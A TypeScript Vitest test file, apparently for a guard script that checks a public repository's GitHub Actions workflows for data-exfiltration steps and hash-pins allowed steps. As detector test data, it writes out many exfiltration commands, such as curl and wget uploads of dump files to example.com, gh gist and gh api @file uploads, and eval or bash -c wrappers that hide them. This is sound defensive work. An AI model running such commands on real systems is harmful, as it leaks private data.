import { existsSync, mkdtempSync, mkdirSync, rmSync, symlinkSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  ALLOWED_UPLOAD_ARTIFACT_PATHS,
  assertCutoverLogDir,
  assertSafeMigrateLog,
  assertStagedUpload,
  assertWorkflowUploadAllowlist,
  assertWorkflowsUploadAllowlist,
  assertWorkspaceHasNoDataFiles,
  collectSteps,
  collectWorkflowUnits,
  extractUploadArtifactSteps,
  findForbiddenUploadCommands,
  isUnitAllowlisted,
  loadRunAllowlist,
  neededAllowlist,
  neededStepAllowlist,
  listGithubCiFiles,
  listHash,
  unitHash,
  COMPOSITE_JOB_NAME,
  writesGithubEnv,
  writesGithubPath,
  hasReleasePathWrite,
  hasForbiddenEnvAssignment,
  isAtFileToken,
  isDataUrlencodeFileArg,
  isLtFileToken,
  parseWorkflowDocument,
  lineLooksLikeCacheSave,
  lineLooksLikeGhApiInput,
  lineLooksLikeHttpUpload,
  logLooksLikeRowData,
  looksLikeDataUpload,
  tokenMentionsTool,
} from "../scripts/guard-public-ci.mjs";

const ROOT = new URL("../", import.meta.url).pathname;
const temps: string[] = [];

afterEach(() => {
  for (const dir of temps.splice(0)) {
    rmSync(dir, { recursive: true, force: true });
  }
});

function tmp() {
  const dir = mkdtempSync(join(tmpdir(), "nuvo-guard-"));
  temps.push(dir);
  return dir;
}

function runYaml(cmd: string) {
  return `run: ${JSON.stringify(cmd)}\n`;
}

/** Mini public workflow so default-deny (full:true) applies. */
function wf(
  steps: string,
  extra: { on?: string; job?: string; jobEnv?: Record<string, string>; runsOn?: string } = {},
) {
  const job = extra.job ?? "t";
  const on = extra.on ?? "push";
  const env = extra.jobEnv
    ? `    env:\n${Object.entries(extra.jobEnv)
        .map(([k, v]) => `      ${k}: ${JSON.stringify(v)}`)
        .join("\n")}\n`
    : "";
  const indented = steps
    .replace(/^\n/, "")
    .split("\n")
    .map((line) => (line.length ? `      ${line}` : line))
    .join("\n");
  return [
    `on: ${on}`,
    "jobs:",
    `  ${job}:`,
    `    runs-on: ${extra.runsOn ?? "ubuntu-latest"}`,
    `${env}    steps:`,
    indented,
    "",
  ].join("\n");
}

const PINNED_PUBLISH = [
  'DMG=$(ls "$BUNDLE"/dmg/*.dmg | head -1)',
  'APPTAR=$(ls "$BUNDLE"/macos/*.app.tar.gz | head -1)',
  'STABLE_DMG="Nuvo.dmg"',
  "NOTES=$(cat RELEASE_NOTES.md)",
];

function releasePublishYaml(createLine: string, assigns: string | string[] = PINNED_PUBLISH) {
  const lines = Array.isArray(assigns) ? assigns : [assigns];
  return ["run: |", ...lines.map((a) => `  ${a}`), `  ${createLine}`, ""].join("\n");
}

const DESKTOP_CREATE =
  'gh release create "$TAG" --repo "$RELEASES_REPO" --title t --notes "$NOTES" --latest "$DMG" "$STABLE_DMG" "$APPTAR" latest.json';

describe("public-repo CI guard", () => {
  it("allowlists no upload-artifact paths", () => {
    expect(ALLOWED_UPLOAD_ARTIFACT_PATHS).toEqual([]);
  });

  it("accepts the committed workflows", () => {
    const steps = assertWorkflowsUploadAllowlist(join(ROOT, ".github"));
    expect(steps).toHaveLength(0);
    expect(assertWorkflowsUploadAllowlist(join(ROOT, ".github/workflows"))).toHaveLength(0);
  });

  it("keeps the original multiline patch-updater and write-version node scripts", () => {
    const release = readFileSync(join(ROOT, ".github/workflows/release.yml"), "utf8");
    expect(release).toMatch(/node -e "\n\s+const fs = require\('fs'\);/);
    expect(release).toMatch(/package-lock\.json carries the same version/);
    expect(findForbiddenUploadCommands(release, "release.yml", { allowlist: loadRunAllowlist() })).toEqual([]);
  });

  it("rejects a dump upload", () => {
    expect(() =>
      assertWorkflowUploadAllowlist(
        "uses: actions/upload-artifact@sha\nwith:\n  path: secret.dump\n",
        "bad.yml",
      ),
    ).toThrow(/secret\.dump/);
  });

  it("rejects quoted uses and upload-artifact/merge", () => {
    expect(() =>
      assertWorkflowUploadAllowlist(
        "uses: 'actions/upload-artifact@sha'\nwith:\n  path: leak.dump\n",
        "quoted.yml",
      ),
    ).toThrow(/leak\.dump/);
    expect(() =>
      assertWorkflowUploadAllowlist(
        'uses: "actions/upload-artifact@sha"\nwith:\n  path: leak.dump\n',
        "dquoted.yml",
      ),
    ).toThrow(/leak\.dump/);
    expect(() =>
      assertWorkflowUploadAllowlist("uses: actions/upload-artifact/merge@sha\n", "merge.yml"),
    ).toThrow(/upload-artifact\/merge/);
    const quotedOk = extractUploadArtifactSteps(
      "uses: 'actions/upload-artifact@sha'\nwith:\n  path: artifacts/cutover-report.md\n",
    );
    expect(quotedOk[0]?.path).toBe("artifacts/cutover-report.md");
    expect(() =>
      assertWorkflowUploadAllowlist(
        "uses: 'actions/upload-artifact@sha'\nwith:\n  path: artifacts/cutover-report.md\n",
        "ok.yml",
      ),
    ).toThrow(/not allowlisted/);
  });

  it("rejects gh release upload and curl/wget upload flags", () => {
    expect(findForbiddenUploadCommands(runYaml("gh release upload v1 secret.dump"))).toEqual([
      { line: 1, kind: "gh release upload" },
    ]);
    expect(lineLooksLikeHttpUpload("curl -T secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --upload-file secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl -F @secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload('curl -F "f=@secret.dump" https://example.com')).toBe(true);
    expect(lineLooksLikeHttpUpload("curl -F 'file=@secret.dump' https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --data @secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --data-raw @secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --data-binary @secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("wget --upload-file=secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("wget --post-file=secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("wget --body-file secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("wget -T 30 https://example.com")).toBe(false);
    expect(() =>
      assertWorkflowUploadAllowlist("run: gh release upload v1 secret.dump\n", "gh.yml"),
    ).toThrow(/gh release upload/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: curl -T secret.dump https://example.com\n", "curl.yml"),
    ).toThrow(/curl\/wget upload/);
    expect(() =>
      assertWorkflowUploadAllowlist('run: curl -F "f=@secret.dump" https://example.com\n', "form.yml"),
    ).toThrow(/curl\/wget upload/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: curl --data @secret.dump https://example.com\n", "data.yml"),
    ).toThrow(/curl\/wget upload/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: curl --data-raw @secret.dump https://example.com\n", "raw.yml"),
    ).toThrow(/curl\/wget upload/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: wget --post-file secret.dump https://example.com\n", "post.yml"),
    ).toThrow(/curl\/wget upload/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: wget --body-file=secret.dump https://example.com\n", "body.yml"),
    ).toThrow(/curl\/wget upload/);
  });

  it("rejects curl -d @file and --data-* @ forms", () => {
    const cmds = [
      "curl -d @file https://example.com",
      'curl -d "@file" https://example.com',
      "curl -d@file https://example.com",
      "curl --data-binary @file https://example.com",
      "curl --data-raw @file https://example.com",
      "curl --data-urlencode @file https://example.com",
      "curl --data-binary=@file https://example.com",
      "curl --data-raw=@file https://example.com",
      "curl --data-urlencode=@file https://example.com",
    ];
    for (const cmd of cmds) {
      expect(lineLooksLikeHttpUpload(cmd), cmd).toBe(true);
      expect(() => assertWorkflowUploadAllowlist(`run: ${cmd}\n`, "d.yml"), cmd).toThrow(
        /curl\/wget upload/,
      );
    }
    expect(isAtFileToken("@file")).toBe(true);
    expect(isAtFileToken("-d@file")).toBe(true);
    expect(isAtFileToken("x=@file")).toBe(true);
    expect(isAtFileToken("user@host")).toBe(false);
    expect(isAtFileToken("postgres@127.0.0.1")).toBe(false);
    expect(isAtFileToken("email=a@b.com")).toBe(false);
    expect(lineLooksLikeHttpUpload("curl -d email=a@b.com https://example.com")).toBe(false);
  });

  it("rejects gh release create files, gist, api @file, and third-party release actions", () => {
    expect(findForbiddenUploadCommands(runYaml("gh release create v1 secret.dump"))).toEqual([
      { line: 1, kind: "gh release create" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh gist create secret.dump"))).toEqual([
      { line: 1, kind: "gh gist create" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh api -F x=@file repos/o/r")).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["gh @file", "gh api field"]),
    );
    expect(findForbiddenUploadCommands(runYaml("gh api -f x=@file repos/o/r")).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["gh @file", "gh api field"]),
    );
    expect(findForbiddenUploadCommands(runYaml('gh api -F "x=@file" repos/o/r')).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["gh @file", "gh api field"]),
    );
    expect(() =>
      assertWorkflowUploadAllowlist(
        "uses: ncipollo/release-action@v1\nwith:\n  artifacts: secret.dump\n",
        "ncipollo.yml",
      ),
    ).toThrow(/ncipollo\/release-action/);
    expect(() =>
      assertWorkflowUploadAllowlist(
        "uses: svenstaro/upload-release-action@v2\nwith:\n  file: secret.dump\n",
        "sven.yml",
      ),
    ).toThrow(/svenstaro\/upload-release-action/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: gh release create v1 secret.dump\n", "create.yml"),
    ).toThrow(/gh release create/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: gh gist create secret.dump\n", "gist.yml"),
    ).toThrow(/gh gist create/);
    expect(() =>
      assertWorkflowUploadAllowlist("run: gh api -F x=@file repos/o/r\n", "field.yml"),
    ).toThrow(/gh @file/);
    const desktopPublish = releasePublishYaml(DESKTOP_CREATE);
    expect(findForbiddenUploadCommands(desktopPublish, "release.yml")).toEqual([]);
    expect(findForbiddenUploadCommands(desktopPublish, "cutover-migrate.yml")).toEqual([
      { line: 5, kind: "gh release create" },
    ]);
    expect(
      findForbiddenUploadCommands(runYaml("gh api repos/o/r --method PUT --field content=$CONTENT")),
    ).toEqual([{ line: 1, kind: "gh api field" }]);
    expect(
      findForbiddenUploadCommands(
        runYaml("gh api repos/o/r --method PUT --field content=$CONTENT"),
        "release.yml",
      ),
    ).toEqual([]);
  });

  it("rejects gh api --input, action-gh-release, and cache save", () => {
    expect(lineLooksLikeGhApiInput("gh api repos/o/r/contents/f --input secret.dump")).toBe(true);
    expect(lineLooksLikeGhApiInput("gh api repos/o/r --method GET")).toBe(false);
    expect(lineLooksLikeCacheSave("uses: actions/cache/save@v4")).toBe(true);
    expect(lineLooksLikeCacheSave("uses: actions/cache@v4")).toBe(true);
    expect(lineLooksLikeCacheSave('uses: "actions/cache@v4"')).toBe(true);
    expect(lineLooksLikeCacheSave("uses: actions/cache/restore@v4")).toBe(false);
    expect(() =>
      assertWorkflowUploadAllowlist("run: gh api repos/o/r/contents/f --input secret.dump\n", "input.yml"),
    ).toThrow(/gh api --input/);
    expect(() =>
      assertWorkflowUploadAllowlist("uses: softprops/action-gh-release@v2\n", "rel.yml"),
    ).toThrow(/softprops\/action-gh-release/);
    expect(() =>
      assertWorkflowUploadAllowlist("uses: actions/cache/save@v4\n", "cachesave.yml"),
    ).toThrow(/actions\/cache\/save/);
    expect(() =>
      assertWorkflowUploadAllowlist("uses: actions/cache@v4\nwith:\n  path: dist\n", "cache.yml"),
    ).toThrow(/actions\/cache save/);
    assertWorkflowUploadAllowlist("uses: actions/cache/restore@v4\n", "cacherestore.yml");
  });

  it("reads uses: from the parsed YAML tree, including flow-map and folded values", () => {
    const flow = [
      "on: push",
      "jobs:",
      "  t:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - { uses: softprops/action-gh-release@v2 }",
      "",
    ].join("\n");
    expect(collectSteps(flow).map((s) => s.uses)).toEqual(["softprops/action-gh-release@v2"]);
    expect(() => assertWorkflowUploadAllowlist(flow, "flow.yml")).toThrow(/softprops\/action-gh-release/);

    const folded = [
      "on: push",
      "jobs:",
      "  t:",
      "    steps:",
      "      - uses: >",
      "          ncipollo/release-action@v1",
      "",
    ].join("\n");
    expect(collectSteps(folded)[0]?.uses).toMatch(/^ncipollo\/release-action@v1/);
    expect(() => assertWorkflowUploadAllowlist(folded, "fold.yml")).toThrow(/ncipollo\/release-action/);

    const literal = [
      "jobs:",
      "  t:",
      "    steps:",
      "      - uses: |",
      "          svenstaro/upload-release-action@v2",
      "",
    ].join("\n");
    expect(() => assertWorkflowUploadAllowlist(literal, "lit.yml")).toThrow(/svenstaro\/upload-release-action/);
  });

  it("rejects curl -F with < file contents", () => {
    expect(isLtFileToken("a=<file")).toBe(true);
    expect(isLtFileToken("-F<file")).toBe(true);
    expect(lineLooksLikeHttpUpload('curl -F "a=<file" https://example.com')).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --form a=<secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl -d a<b https://example.com")).toBe(false);
    expect(() =>
      assertWorkflowUploadAllowlist('run: curl -F "a=<file" https://example.com\n', "lt.yml"),
    ).toThrow(/curl\/wget upload/);
  });

  it("rejects curl --data-urlencode name@file", () => {
    expect(isDataUrlencodeFileArg("name@file")).toBe(true);
    expect(isDataUrlencodeFileArg("@file")).toBe(true);
    expect(isDataUrlencodeFileArg("name=value")).toBe(false);
    expect(lineLooksLikeHttpUpload("curl --data-urlencode name@file https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --data-urlencode=name@secret.dump https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("curl --data-urlencode name=value https://example.com")).toBe(false);
    expect(() =>
      assertWorkflowUploadAllowlist("run: curl --data-urlencode name@file https://example.com\n", "enc.yml"),
    ).toThrow(/curl\/wget upload/);
  });

  it("detects curl/wget/gh inside command tokens, not just as a bare word", () => {
    expect(tokenMentionsTool("$(which curl)", "curl")).toBe(true);
    expect(tokenMentionsTool("`curl`", "curl")).toBe(true);
    expect(tokenMentionsTool("curl)", "curl")).toBe(true);
    expect(tokenMentionsTool("github", "gh")).toBe(false);
    expect(lineLooksLikeHttpUpload("$(which curl) -d @f https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("`curl` -d @f https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("env curl -d @f https://example.com")).toBe(true);
    expect(lineLooksLikeHttpUpload("command curl -d @f https://example.com")).toBe(true);
    expect(findForbiddenUploadCommands(runYaml("$(which curl) -d @f https://example.com")).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["curl/wget upload", "dirty command"]),
    );
    expect(findForbiddenUploadCommands(runYaml("command gh gist create secret.dump"))).toEqual([
      { line: 1, kind: "gh gist create" },
    ]);
  });

  it("allows gh release create assets only in release.yml with the exact desktop tokens", () => {
    const sneak = "tar czf d.tar.gz dump; gh release create x d.tar.gz";
    expect(findForbiddenUploadCommands(runYaml(sneak), "cutover-migrate.yml")).toEqual([
      { line: 1, kind: "gh release create" },
    ]);
    expect(() => assertWorkflowUploadAllowlist(runYaml(sneak), "cutover-migrate.yml")).toThrow(
      /gh release create/,
    );
    expect(findForbiddenUploadCommands(runYaml("gh release create x $DUMP"), "other.yml")).toEqual([
      { line: 1, kind: "gh release create" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh release create x secret.dump"), "other.yml")).toEqual([
      { line: 1, kind: "gh release create" },
    ]);
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml('gh release create "$TAG" --repo "$RELEASES_REPO" --notes "$NOTES" --latest d.tar.gz'),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("gh release create file");
  });

  it("denies local ./ and docker:// uses unless allowlisted", () => {
    expect(() => assertWorkflowUploadAllowlist("uses: ./local-upload\n", "local.yml")).toThrow(/local uses/);
    expect(() =>
      assertWorkflowUploadAllowlist("uses: docker://ghcr.io/foo/upload:latest\n", "dock.yml"),
    ).toThrow(/docker:\/\/ uses/);
    expect(() =>
      assertWorkflowUploadAllowlist(
        ["on: push", "jobs:", "  t:", "    steps:", "      - { uses: ./evil }", ""].join("\n"),
        "flow-local.yml",
      ),
    ).toThrow(/local uses/);
  });

  it("rejects gh issue/pr --body-file and -F", () => {
    expect(findForbiddenUploadCommands(runYaml("gh issue create --body-file secret.dump"))).toEqual([
      { line: 1, kind: "gh file flag" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh pr create -F secret.dump"))).toEqual([
      { line: 1, kind: "gh file flag" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh issue comment 1 --body-file notes.md"))).toEqual([
      { line: 1, kind: "gh file flag" },
    ]);
    expect(() =>
      assertWorkflowUploadAllowlist(runYaml("gh pr create --body-file dump.csv"), "pr.yml"),
    ).toThrow(/gh file flag/);
    expect(findForbiddenUploadCommands(runYaml("gh pr list"))).toEqual([]);
  });

  it("denies gh release create/edit/upload outside release.yml, and edit/upload inside it", () => {
    expect(findForbiddenUploadCommands(runYaml("gh release create v1 --notes-file secret.dump"), "leak.yml")).toEqual(
      [{ line: 1, kind: "gh release create" }],
    );
    expect(findForbiddenUploadCommands(runYaml("gh release edit v1 --notes-file dump.csv"), "release.yml")).toEqual([
      { line: 1, kind: "gh release edit" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh release upload v1 secret.dump"), "release.yml")).toEqual([
      { line: 1, kind: "gh release upload" },
    ]);
    expect(findForbiddenUploadCommands(runYaml("gh gist edit id --body-file secret.dump"))).toEqual([
      { line: 1, kind: "gh file flag" },
    ]);
    expect(() =>
      assertWorkflowUploadAllowlist(runYaml("gh release create v1 --notes-file notes.md"), "any.yml"),
    ).toThrow(/gh release create/);
  });

  it("throws on YAML parse errors, multiple documents, and a non-mapping root", () => {
    expect(() => parseWorkflowDocument("uses: [\n")).toThrow(/parse error/);
    expect(() => findForbiddenUploadCommands("uses: [\n")).toThrow(/parse error/);
    expect(() => assertWorkflowUploadAllowlist("---\na: 1\n---\nb: 2\n", "multi.yml")).toThrow(
      /exactly one document/,
    );
    expect(() => parseWorkflowDocument("- uses: softprops/action-gh-release@v2\n")).toThrow(
      /root must be a mapping/,
    );
    expect(() => findForbiddenUploadCommands("gh release upload v1 secret.dump\n")).toThrow(
      /root must be a mapping/,
    );
  });

  it("fails on duplicate keys and << merge keys", () => {
    expect(() => parseWorkflowDocument("on: push\non: pull_request\njobs: {}\n")).toThrow(/parse error|unique/);
    expect(() =>
      assertWorkflowUploadAllowlist(
        ["x: &a", "  uses: softprops/action-gh-release@v2", "jobs:", "  t:", "    steps:", "      - <<: *a", ""].join(
          "\n",
        ),
        "merge.yml",
      ),
    ).toThrow(/merge keys/);
  });

  it("rejects interpolated notes, glued -F, two-step assignment, and double --repo", () => {
    expect(
      findForbiddenUploadCommands(runYaml('gh issue create --notes "$(cat dump.sql)"')),
    ).toEqual([{ line: 1, kind: "gh interpolated notes" }]);

    expect(
      findForbiddenUploadCommands(runYaml('X=$(cat dump); gh issue create --notes "$X"')),
    ).toEqual([{ line: 1, kind: "gh interpolated notes" }]);
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(DESKTOP_CREATE.replace('--notes "$NOTES"', '--notes "$X"'), "X=$(cat dump)"),
        "release.yml",
      ).map((h) => h.kind),
    ).toEqual(expect.arrayContaining(["gh release notes", "NOTES assignment"]));

    expect(findForbiddenUploadCommands(runYaml("gh release create v1 -Fdump.sql"), "other.yml")).toEqual([
      { line: 1, kind: "gh release create" },
    ]);
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(
          'gh release create "$TAG" --repo "$RELEASES_REPO" --notes "$NOTES" --latest -Fdump.sql "$DMG" "$STABLE_DMG" "$APPTAR" latest.json',
        ),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("gh release notes");

    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(
          'gh release create "$TAG" --repo "$RELEASES_REPO" --repo x/y --notes "$NOTES" --latest "$DMG" "$STABLE_DMG" "$APPTAR" latest.json',
        ),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("gh release repo");
  });

  it("requires the exact desktop publish shape in release.yml", () => {
    expect(findForbiddenUploadCommands(releasePublishYaml(DESKTOP_CREATE), "release.yml")).toEqual([]);
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(DESKTOP_CREATE, "NOTES=$(cat dump.sql)"),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("NOTES assignment");
  });

  it("rejects interpolated gh api -f/-F/--field/--raw-field values and -F/--input @file", () => {
    const leaks = [
      'gh api repos/o/r -f body="$(cat dump.sql)"',
      "gh api repos/o/r -F body=@dump.sql",
      "gh api repos/o/r --raw-field content=$DUMP",
      "gh api repos/o/r --field=content=$DUMP",
      "gh api repos/o/r -fbody=$DUMP",
      "DUMP=$(cat dump.sql); gh api repos/o/r -f body=$DUMP",
      "gh api repos/o/r --input @dump.sql",
    ];
    for (const cmd of leaks) {
      expect(findForbiddenUploadCommands(runYaml(cmd)).map((h) => h.kind), cmd).toEqual(
        expect.arrayContaining([
          expect.stringMatching(/gh api field|gh api --input|gh @file/),
        ]),
      );
    }
    expect(
      findForbiddenUploadCommands(
        runYaml('gh api repos/o/r --field "content=$CONTENT" --field "sha=$FILE_SHA"'),
        "release.yml",
      ),
    ).toEqual([]);
  });

  it("rejects bash -c, sh -c, any shell -c, and eval that hide gh", () => {
    expect(findForbiddenUploadCommands(runYaml("bash -c 'gh gist create dump.sql'")).map((h) => h.kind)).toContain(
      "shell -c",
    );
    expect(findForbiddenUploadCommands(runYaml('sh -c "gh api -f body=$(cat dump)"')).map((h) => h.kind)).toContain(
      "shell -c",
    );
    expect(findForbiddenUploadCommands(runYaml("zsh -c 'gh release create v1 dump.sql'")).map((h) => h.kind)).toContain(
      "shell -c",
    );
    expect(findForbiddenUploadCommands(runYaml('eval "gh gist create dump.sql"')).map((h) => h.kind)).toContain("eval");
    expect(findForbiddenUploadCommands(runYaml('bash -c "$CMD"')).map((h) => h.kind)).toContain("shell -c");
    expect(findForbiddenUploadCommands(runYaml("bash -c 'echo ok'")).map((h) => h.kind)).not.toContain(
      "step allowlist",
    );
  });

  it("rejects backslashes, quotes, and $ / ${} / $(...) in command position", () => {
    expect(findForbiddenUploadCommands(runYaml("$G gist create dump.sql")).map((h) => h.kind)).toContain(
      "dirty command",
    );
    expect(findForbiddenUploadCommands(runYaml("${G} api -f body=@dump.sql")).map((h) => h.kind)).toContain(
      "dirty command",
    );
    expect(findForbiddenUploadCommands(runYaml("$(which gh) gist create dump.sql")).map((h) => h.kind)).toContain(
      "dirty command",
    );
    expect(findForbiddenUploadCommands(runYaml("\\gh gist create dump.sql")).map((h) => h.kind)).toContain(
      "dirty command",
    );
    expect(findForbiddenUploadCommands(runYaml('"gh" gist create dump.sql')).map((h) => h.kind)).toContain(
      "dirty command",
    );
  });

  it("denies gh alias set and gh alias import everywhere", () => {
    expect(findForbiddenUploadCommands(runYaml("gh alias set leak 'pr create --title t'")).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["gh alias"]),
    );
    expect(findForbiddenUploadCommands(runYaml("gh alias import aliases.yml"), "release.yml").map((h) => h.kind)).toEqual(
      expect.arrayContaining(["gh alias"]),
    );
    expect(() => assertWorkflowUploadAllowlist(runYaml("gh alias set x 'pr create'"), "alias.yml")).toThrow(
      /gh alias/,
    );
  });

  it("pins exactly one DMG/STABLE_DMG/APPTAR/NOTES assignment in the release step", () => {
    expect(findForbiddenUploadCommands(releasePublishYaml(DESKTOP_CREATE), "release.yml")).toEqual([]);
    const reassign = releasePublishYaml(DESKTOP_CREATE, [
      ...PINNED_PUBLISH,
      'DMG=$(ls "$BUNDLE"/dmg/*.dmg | head -1)',
    ]);
    expect(findForbiddenUploadCommands(reassign, "release.yml").map((h) => h.kind)).toContain("DMG assignment");
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(DESKTOP_CREATE, [
          'DMG=/tmp/dump.dmg',
          'APPTAR=$(ls "$BUNDLE"/macos/*.app.tar.gz | head -1)',
          'STABLE_DMG="Nuvo.dmg"',
          "NOTES=$(cat RELEASE_NOTES.md)",
        ]),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("DMG assignment");
    expect(
      findForbiddenUploadCommands(
        releasePublishYaml(DESKTOP_CREATE, [
          'DMG=$(ls "$BUNDLE"/dmg/*.dmg | head -1)',
          'APPTAR=$(ls "$BUNDLE"/macos/*.app.tar.gz | head -1)',
          'STABLE_DMG="other.dmg"',
          "NOTES=$(cat RELEASE_NOTES.md)",
        ]),
        "release.yml",
      ).map((h) => h.kind),
    ).toContain("STABLE_DMG assignment");
  });

  it("pins yaml at exactly 2.9.1", () => {
    const pkg = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8"));
    expect(pkg.devDependencies.yaml).toBe("2.9.1");
  });

  it("documents Limits: default-deny allowlist and regen script", () => {
    const src = readFileSync(join(ROOT, "scripts/guard-public-ci.mjs"), "utf8");
    expect(src).toMatch(/## Limits/);
    expect(src).toMatch(/actions\/github-script/);
    expect(src).toMatch(/default-deny/);
    expect(src).toMatch(/non-`gh` exfil/);
    expect(src).toMatch(/`nc`/);
    expect(src).toMatch(/Reviewers must read the hashed step/);
    expect(src).toMatch(/regen-public-ci-allowlist/);
    expect(src).toMatch(/guard-public-ci\.allowlist\.json/);
    expect(src).toMatch(/whole canonical step/);
    expect(src).toMatch(/duplicate step ids/);
    expect(src).toMatch(/aliases\/anchors/);
    expect(existsSync(join(ROOT, "scripts/regen-public-ci-allowlist.mjs"))).toBe(true);
  });

  it("accepts a step only when file + job + id + whole-unit hash match", () => {
    const text = wf("- id: pinned\n  run: echo hi");
    const unit = collectWorkflowUnits(text).units[0];
    expect(unit?.id).toBe("pinned");
    expect(unit?.job).toBe("t");
    const entry = { file: "t.yml", job: "t", id: "pinned", sha256: unitHash(unit) };
    expect(findForbiddenUploadCommands(text, "t.yml", { allowlist: [entry] })).toEqual([]);
    expect(findForbiddenUploadCommands(text, "t.yml", { allowlist: [] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );
    expect(
      findForbiddenUploadCommands(text, "t.yml", {
        allowlist: [{ ...entry, sha256: "0".repeat(64) }],
      }).map((h) => h.kind),
    ).toContain("step allowlist");
    expect(
      findForbiddenUploadCommands(text, "t.yml", { allowlist: [{ ...entry, job: "other" }] }).map((h) => h.kind),
    ).toContain("step allowlist");
    expect(isUnitAllowlisted("t.yml", unit, [entry])).toBe(true);
  });

  it("committed allowlist hashes match every workflow unit", () => {
    const needed = neededAllowlist(join(ROOT, ".github/workflows"));
    const committed = loadRunAllowlist();
    expect(needed.steps.length).toBeGreaterThan(10);
    expect(needed.steps.every((s) => s.file && s.job && s.id && s.sha256)).toBe(true);
    expect(needed.job_steps.every((j) => j.file && j.job && Array.isArray(j.ids) && j.sha256)).toBe(true);
    expect(needed.workflow_jobs.every((w) => w.file && Array.isArray(w.jobs) && w.sha256)).toBe(true);
    expect(committed).toEqual(needed);
    expect(neededStepAllowlist(join(ROOT, ".github/workflows"))).toEqual(needed.steps);
  });

  it("100e: env/shell/working-directory edits, copied job BUNDLE override, pull_request_target", () => {
    const release = readFileSync(join(ROOT, ".github/workflows/release.yml"), "utf8");
    const allowlist = loadRunAllowlist();
    const publish = collectWorkflowUnits(release).units.find((u) => u.job === "release" && u.id === "publish");
    if (!publish) throw new Error("release.yml publish step missing");
    expect(isUnitAllowlisted("release.yml", publish, allowlist)).toBe(true);

    expect(
      isUnitAllowlisted(
        "release.yml",
        { ...publish, stepCanon: { ...publish.stepCanon, env: { ...(publish.stepCanon?.env ?? {}), LEAK: "1" } } },
        allowlist,
      ),
    ).toBe(false);
    expect(
      isUnitAllowlisted("release.yml", { ...publish, stepCanon: { ...publish.stepCanon, shell: "bash" } }, allowlist),
    ).toBe(false);
    expect(
      isUnitAllowlisted(
        "release.yml",
        { ...publish, stepCanon: { ...publish.stepCanon, "working-directory": "/tmp" } },
        allowlist,
      ),
    ).toBe(false);
    expect(
      isUnitAllowlisted(
        "release.yml",
        { ...publish, wfCanon: { ...publish.wfCanon, on: { pull_request_target: {} } } },
        allowlist,
      ),
    ).toBe(false);
    expect(
      isUnitAllowlisted(
        "release.yml",
        {
          ...publish,
          job: "leak",
          jobCanon: { ...publish.jobCanon, env: { ...(publish.jobCanon?.env ?? {}), BUNDLE: "/tmp/leak" } },
        },
        allowlist,
      ),
    ).toBe(false);

    const envEdit = wf("- id: s\n  run: echo hi\n  env:\n    FOO: bar");
    const envUnit = collectWorkflowUnits(envEdit).units[0];
    const envEntry = {
      file: "t.yml",
      job: "t",
      id: "s",
      sha256: unitHash({ ...envUnit, stepCanon: { ...envUnit.stepCanon, env: null } }),
    };
    expect(findForbiddenUploadCommands(envEdit, "t.yml", { allowlist: [envEntry] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );

    const shellEdit = wf("- id: s\n  shell: bash\n  run: echo hi");
    const shellUnit = collectWorkflowUnits(shellEdit).units[0];
    const shellEntry = {
      file: "t.yml",
      job: "t",
      id: "s",
      sha256: unitHash({ ...shellUnit, stepCanon: { ...shellUnit.stepCanon, shell: null } }),
    };
    expect(findForbiddenUploadCommands(shellEdit, "t.yml", { allowlist: [shellEntry] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );

    const wdEdit = wf("- id: s\n  working-directory: /tmp\n  run: echo hi");
    const wdUnit = collectWorkflowUnits(wdEdit).units[0];
    const wdEntry = {
      file: "t.yml",
      job: "t",
      id: "s",
      sha256: unitHash({ ...wdUnit, stepCanon: { ...wdUnit.stepCanon, "working-directory": null } }),
